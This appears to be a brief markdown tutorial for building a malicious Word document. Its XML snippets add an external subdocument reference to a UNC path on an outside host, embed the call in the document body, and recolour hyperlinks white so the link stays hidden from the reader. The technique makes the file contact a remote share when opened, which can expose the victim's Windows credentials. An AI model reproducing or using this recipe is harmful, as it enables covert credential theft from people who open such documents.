# How to subdoc 101

## Add subdoc relationship to the document relationships

##### Important notice: The Target has to start with `file:///` (normal slashes) and the UNC path after (with back slashes)

`word/_rels/document.xml.rels`

```xml
<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument" Target="file:///\\biscoito.eu\test\" TargetMode="External"/>
```

## Place the subdoc call before the end of the first page section

`word/document.xml`

```xml
<!-- Create a paragraph for it, why not! :) -->
<!-- Ref: http://www.datypic.com/sc/ooxml/e-w_subDoc-1.html -->
<w:p w:rsidR="00212331" w:rsidRPr="002B0DC2" w:rsidRDefault="00212331">
    <w:subDoc r:id="rId5"/>
</w:p>
<w:sectPr (...)
```

## Change all hyperlink colors to `#FFFFFF`

`word/styles.xml`

```xml
<w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00400B73"/>
    <w:rPr>     <!-- Here V -->
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:u w:val="single"/>
    </w:rPr>
 </w:style>
 ```
